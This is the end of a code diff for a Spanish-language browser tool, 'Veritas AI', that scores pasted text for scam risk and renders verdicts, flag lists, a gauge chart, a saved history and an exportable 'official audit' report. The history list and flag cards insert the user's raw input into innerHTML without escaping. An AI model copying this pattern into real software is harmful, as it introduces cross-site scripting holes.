+            if (score > 50) {
+                greenFlags.push({
+                    title: "Ausencia de Patrones de Infección Conocidos",
+                    desc: "No se identificaron firmas de exploits o malware común."
+                });
+            }
+
+            // Ensure bounds
+            score = Math.max(5, Math.min(98, score));
+
+            // Render Output
+            renderVerdictUI(score, redFlags, greenFlags, text);
+        }
+
+        // RENDER VERDICT DASHBOARD
+        function renderVerdictUI(score, redFlags, greenFlags, rawInput) {
+            document.getElementById('resultDashboard').classList.remove('hidden');
+
+            // Render Score Counter
+            document.getElementById('authScoreDisplay').innerText = `${score}%`;
+
+            // Threat Badge Config
+            const threatBadge = document.getElementById('threatBadge');
+            let threatLevel = 'SEGURO';
+            let badgeStyle = 'bg-cyber-emerald/10 border-cyber-emerald text-cyber-emerald';
+
+            if (score < 40) {
+                threatLevel = '🚨 ALERTA DE IMPOSTOR / ESTAFA';
+                badgeStyle = 'bg-cyber-danger/20 border-cyber-danger text-cyber-danger neon-border-danger';
+                playBeep(200, 'sawtooth', 0.4);
+            } else if (score < 75) {
+                threatLevel = '⚠️ SOSPECHOSO / RIESGO MODERADO';
+                badgeStyle = 'bg-cyber-amber/10 border-cyber-amber text-cyber-amber';
+                playBeep(450, 'triangle', 0.25);
+            } else {
+                threatLevel = '🛡️ ALTA PROBABILIDAD DE AUTENTICIDAD';
+                playBeep(880, 'sine', 0.2);
+            }
+
+            threatBadge.className = `px-4 py-2 rounded-xl text-xs font-orbitron font-bold tracking-wider flex items-center gap-2 border ${badgeStyle}`;
+            threatBadge.innerHTML = threatLevel;
+
+            // Executive Summary text
+            const execSummary = document.getElementById('executiveSummary');
+            const actions = document.getElementById('recommendedActions');
+
+            if (score < 40) {
+                execSummary.innerHTML = `<strong>RIESGO ELEVADO DETECTADO:</strong> La muestra analizada contiene <span class="text-cyber-danger font-bold">${redFlags.length} indicadores críticos de manipulación o engaño</span>. Existe una alta probabilidad de que se trate de un fraude, perfil impostor o bot engañoso.`;
+                actions.innerText = "No realice pagos, no comparta datos personales, evite ejecutar el código y bloquee la fuente inmediatamente.";
+            } else if (score < 75) {
+                execSummary.innerHTML = `<strong>EVALUACIÓN AMBIGUA / SOSPECHOSA:</strong> Se han detectado incongruencias menores o falta de verificación de origen. Proceda con precaución.`;
+                actions.innerText = "Solicite pruebas adicionales de identidad, verifique el dominio oficial o realice una búsqueda cruzada de referencias.";
+            } else {
+                execSummary.innerHTML = `<strong>EVALUACIÓN FAVORABLE:</strong> El contenido presenta un nivel alto de coherencia lógica y no coincide con patrones de fraude activo registradas.`;
+                actions.innerText = "El riesgo aparente es bajo. Mantenga siempre las buenas prácticas habituales de ciberseguridad.";
+            }
+
+            // Render Red Flags List
+            const redContainer = document.getElementById('redFlagsList');
+            document.getElementById('redFlagCount').innerText = redFlags.length;
+            redContainer.innerHTML = '';
+
+            if (redFlags.length === 0) {
+                redContainer.innerHTML = `<div class="p-3 rounded-xl bg-cyber-bg text-slate-500 text-xs font-mono italic">No se detectaron anomalías severas.</div>`;
+            } else {
+                redFlags.forEach(flag => {
+                    redContainer.innerHTML += `
+                        <div class="p-3 rounded-xl bg-cyber-bg border border-cyber-danger/30 space-y-1">
+                            <div class="flex items-center justify-between">
+                                <span class="font-mono text-xs font-bold text-cyber-danger flex items-center gap-1.5">
+                                    <i data-lucide="alert-circle" class="w-3.5 h-3.5"></i> ${flag.title}
+                                </span>
+                                <span class="text-[9px] font-mono px-1.5 py-0.5 rounded bg-cyber-danger/20 text-cyber-danger border border-cyber-danger/40">${flag.severity}</span>
+                            </div>
+                            <p class="text-[11px] text-slate-400 font-sans">${flag.desc}</p>
+                        </div>
+                    `;
+                });
+            }
+
+            // Render Green Flags List
+            const greenContainer = document.getElementById('greenFlagsList');
+            document.getElementById('greenFlagCount').innerText = greenFlags.length;
+            greenContainer.innerHTML = '';
+
+            greenFlags.forEach(flag => {
+                greenContainer.innerHTML += `
+                    <div class="p-3 rounded-xl bg-cyber-bg border border-cyber-emerald/30 space-y-1">
+                        <span class="font-mono text-xs font-bold text-cyber-emerald flex items-center gap-1.5">
+                            <i data-lucide="check" class="w-3.5 h-3.5"></i> ${flag.title}
+                        </span>
+                        <p class="text-[11px] text-slate-400 font-sans">${flag.desc}</p>
+                    </div>
+                `;
+            });
+
+            // Update Gauge Chart
+            renderGaugeChart(score);
+
+            // Save to history
+            const historyItem = {
+                id: Date.now(),
+                date: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+                score: score,
+                threat: threatLevel,
+                snippet: rawInput.substring(0, 45) + '...'
+            };
+            scanHistory.unshift(historyItem);
+            localStorage.setItem('veritas_history', JSON.stringify(scanHistory));
+            renderHistoryList();
+
+            lastAnalysisResult = { score, threatLevel, rawInput, redFlags, greenFlags };
+            lucide.createIcons();
+
+            // Smooth Scroll to result
+            document.getElementById('resultDashboard').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // RENDER RADIAL GAUGE CHART
+        function renderGaugeChart(score) {
+            const ctx = document.getElementById('gaugeChart').getContext('2d');
+
+            if (gaugeChartInstance) {
+                gaugeChartInstance.destroy();
+            }
+
+            let gaugeColor = '#00FF87'; // Emerald
+            if (score < 40) gaugeColor = '#FF0055'; // Danger
+            else if (score < 75) gaugeColor = '#FFB800'; // Amber
+
+            gaugeChartInstance = new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    datasets: [{
+                        data: [score, 100 - score],
+                        backgroundColor: [gaugeColor, '#1E293B'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    cutout: '80%',
+                    rotation: -90,
+                    circumference: 180,
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        tooltip: { enabled: false }
+                    }
+                }
+            });
+        }
+
+        // HISTORY MODAL MANAGEMENT
+        function toggleHistoryModal() {
+            document.getElementById('historyModal').classList.toggle('hidden');
+        }
+
+        function renderHistoryList() {
+            const container = document.getElementById('historyList');
+            container.innerHTML = '';
+
+            if (scanHistory.length === 0) {
+                container.innerHTML = `<p class="text-xs font-mono text-slate-500 text-center py-6">No hay análisis guardados.</p>`;
+                return;
+            }
+
+            scanHistory.forEach(item => {
+                container.innerHTML += `
+                    <div class="p-3 rounded-xl bg-cyber-bg border border-cyber-border space-y-1">
+                        <div class="flex justify-between items-center text-xs font-mono">
+                            <span class="font-bold text-white">${item.score}% Autenticidad</span>
+                            <span class="text-slate-500">${item.date}</span>
+                        </div>
+                        <p class="text-[11px] text-slate-400 font-mono truncate">"${item.snippet}"</p>
+                    </div>
+                `;
+            });
+        }
+
+        function clearHistory() {
+            scanHistory = [];
+            localStorage.removeItem('veritas_history');
+            renderHistoryList();
+            showToast('Historial borrado');
+        }
+
+        // EXPORT REPORT SIMULATION
+        function exportReport() {
+            if (!lastAnalysisResult) return;
+
+            const reportContent = `====================================================
+VERITAS AI - REPORTE OFICIAL DE AUDITORÍA DE VERACIDAD
+====================================================
+Fecha: ${new Date().toLocaleString()}
+Índice de Autenticidad: ${lastAnalysisResult.score}%
+Dictamen: ${lastAnalysisResult.threatLevel}
+
+----------------------------------------------------
+MUESTRA ANALIZADA:
+${lastAnalysisResult.rawInput}
+
+----------------------------------------------------
+ANOMALÍAS DETECTADAS (${lastAnalysisResult.redFlags.length}):
+${lastAnalysisResult.redFlags.map(f => `- [${f.severity}] ${f.title}: ${f.desc}`).join('\n')}
+
+----------------------------------------------------
+PUNTOS DE CONFIANZA (${lastAnalysisResult.greenFlags.length}):
+${lastAnalysisResult.greenFlags.map(f => `- ${f.title}: ${f.desc}`).join('\n')}
+
+====================================================
+VERITAS AI Engine - Documento generado automáticamente.
+====================================================`;
+
+            const blob = new Blob([reportContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `VERITAS_Reporte_${Date.now()}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+
+            showToast('Reporte exportado exitosamente');
+        }
+
+        // TOAST NOTIFICATIONS
+        function showToast(msg, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'bg-cyber-card border border-cyber-cyan/50 text-white text-xs font-mono px-4 py-3 rounded-xl shadow-2xl flex items-center gap-2 pointer-events-auto transition-all transform translate-y-2';
+            toast.innerHTML = `<i data-lucide="info" class="w-4 h-4 text-cyber-cyan"></i><span>${msg}</span>`;
+            container.appendChild(toast);
+            lucide.createIcons();
+
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+
+        // ON LOAD INIT
+        window.addEventListener('DOMContentLoaded', () => {
+            lucide.createIcons();
+            renderHistoryList();
+            updateCharCounter();
+        });
+    </script>
+</body>
+</html>
